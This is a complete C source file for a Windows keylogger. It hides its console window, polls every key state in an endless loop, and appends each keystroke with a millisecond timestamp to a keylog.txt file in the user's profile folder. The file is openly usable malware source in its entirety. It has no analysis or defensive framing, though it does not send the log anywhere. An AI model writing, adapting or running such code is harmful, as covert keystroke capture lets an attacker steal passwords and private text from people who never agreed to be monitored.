#include <stdio.h>
#include <windows.h>
#include <time.h>
#include <sys/time.h>

const char* getKeyName(int key, BOOL shift, BOOL caps) {
    switch (key) {
        // Special keys
        case VK_SPACE: return "[spacebar]";
        case VK_RETURN: return "[enter]";
        case VK_BACK: return "[backspace]";
        case VK_TAB: return "[tab]";
        case VK_SHIFT: return "[shift]";
        case VK_CONTROL: return "[ctrl]";
        case VK_MENU: return "[alt]";
        case VK_CAPITAL: return "[caps lock]";
        case VK_ESCAPE: return "[esc]";
        case VK_UP: return "[up]";
        case VK_DOWN: return "[down]";
        case VK_LEFT: return "[left]";
        case VK_RIGHT: return "[right]";
        case VK_HOME: return "[home]";
        case VK_END: return "[end]";
        case VK_PRIOR: return "[page up]";
        case VK_NEXT: return "[page down]";
        case VK_INSERT: return "[insert]";
        case VK_DELETE: return "[delete]";
        case VK_SNAPSHOT: return "[print screen]";
        case VK_PAUSE: return "[pause]";
        case VK_NUMLOCK: return "[num lock]";
        case VK_SCROLL: return "[scroll lock]";

        // Alphanumeric keys
        case 'A': return shift || caps ? "A" : "a";
        case 'B': return shift || caps ? "B" : "b";
        case 'C': return shift || caps ? "C" : "c";
        case 'D': return shift || caps ? "D" : "d";
        case 'E': return shift || caps ? "E" : "e";
        case 'F': return shift || caps ? "F" : "f";
        case 'G': return shift || caps ? "G" : "g";
        case 'H': return shift || caps ? "H" : "h";
        case 'I': return shift || caps ? "I" : "i";
        case 'J': return shift || caps ? "J" : "j";
        case 'K': return shift || caps ? "K" : "k";
        case 'L': return shift || caps ? "L" : "l";
        case 'M': return shift || caps ? "M" : "m";
        case 'N': return shift || caps ? "N" : "n";
        case 'O': return shift || caps ? "O" : "o";
        case 'P': return shift || caps ? "P" : "p";
        case 'Q': return shift || caps ? "Q" : "q";
        case 'R': return shift || caps ? "R" : "r";
        case 'S': return shift || caps ? "S" : "s";
        case 'T': return shift || caps ? "T" : "t";
        case 'U': return shift || caps ? "U" : "u";
        case 'V': return shift || caps ? "V" : "v";
        case 'W': return shift || caps ? "W" : "w";
        case 'X': return shift || caps ? "X" : "x";
        case 'Y': return shift || caps ? "Y" : "y";
        case 'Z': return shift || caps ? "Z" : "z";

        // Numeric keys
        case '0': return shift ? ")" : "0";
        case '1': return shift ? "!" : "1";
        case '2': return shift ? "@" : "2";
        case '3': return shift ? "#" : "3";
        case '4': return shift ? "$" : "4";
        case '5': return shift ? "%" : "5";
        case '6': return shift ? "^" : "6";
        case '7': return shift ? "&" : "7";
        case '8': return shift ? "*" : "8";
        case '9': return shift ? "(" : "9";

        // Symbol keys
        case VK_OEM_1: return shift ? ":" : ";";  // ;:
        case VK_OEM_PLUS: return shift ? "+" : "=";  // =+
        case VK_OEM_COMMA: return shift ? "<" : ",";  // ,<
        case VK_OEM_MINUS: return shift ? "_" : "-";  // -_
        case VK_OEM_PERIOD: return shift ? ">" : ".";  // .>
        case VK_OEM_2: return shift ? "?" : "/";  // /?
        case VK_OEM_3: return shift ? "~" : "`";  // `~
        case VK_OEM_4: return shift ? "{" : "[";  // [{
        case VK_OEM_5: return shift ? "|" : "\\";  // \|
        case VK_OEM_6: return shift ? "}" : "]";  // ]}
        case VK_OEM_7: return shift ? "\"" : "'";  // '"

        // Numpad keys
        case VK_NUMPAD0: return "0";
        case VK_NUMPAD1: return "1";
        case VK_NUMPAD2: return "2";
        case VK_NUMPAD3: return "3";
        case VK_NUMPAD4: return "4";
        case VK_NUMPAD5: return "5";
        case VK_NUMPAD6: return "6";
        case VK_NUMPAD7: return "7";
        case VK_NUMPAD8: return "8";
        case VK_NUMPAD9: return "9";
        case VK_ADD: return "[numpad +]";
        case VK_SUBTRACT: return "[numpad -]";
        case VK_MULTIPLY: return "[numpad *]";
        case VK_DIVIDE: return "[numpad /]";
        case VK_DECIMAL: return "[numpad .]";

        // Function keys
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";

        // Default case for unhandled keys
        default: return NULL;
    }
}

void logKey(char *filePath, const char *keyName) {
    // Get the current time with milliseconds
    struct timeval tv;
    gettimeofday(&tv, NULL);  // Get the time in seconds and microseconds
    time_t rawtime;
    struct tm *timeinfo;
    char timeBuffer[80];

    // Get the current time as a string
    time(&rawtime);
    timeinfo = localtime(&rawtime);
    strftime(timeBuffer, sizeof(timeBuffer), "%Y-%m-%d %H:%M:%S", timeinfo);
    
    // Open the log file in append mode
    FILE *file = fopen(filePath, "a");
    if (file == NULL) {
        return;
    }

    // Format and log the timestamp with keypress
    fprintf(file, "[\"%s,%03ld\", \"%s\" pressed]\n", timeBuffer, tv.tv_usec / 1000, keyName);
    fclose(file);
}

int main() {
    // Hide the console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    char userProfile[MAX_PATH];
    char filePath[MAX_PATH];

    if (GetEnvironmentVariable("USERPROFILE", userProfile, MAX_PATH) == 0) {
       	snprintf(filePath, MAX_PATH, "c:\\keylog.txt", userProfile);
    }else{
    	snprintf(filePath, MAX_PATH, "%s\\keylog\\keylog.txt", userProfile);

    }
    
    //char *filePath = "C:\\Users\\rishi\\keylog\\keylog.txt";  // Path to save the log file

    BOOL shiftPressed = FALSE;
    BOOL capsLock = GetKeyState(VK_CAPITAL) & 0x0001;

    while (1) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x0001) {

		shiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
                const char *keyName = getKeyName(key, shiftPressed, capsLock);

                // Log the key with timestamp
                logKey(filePath, keyName);
            }
        }
        Sleep(10);  // Reduce CPU usage
    }
    return 0;
}
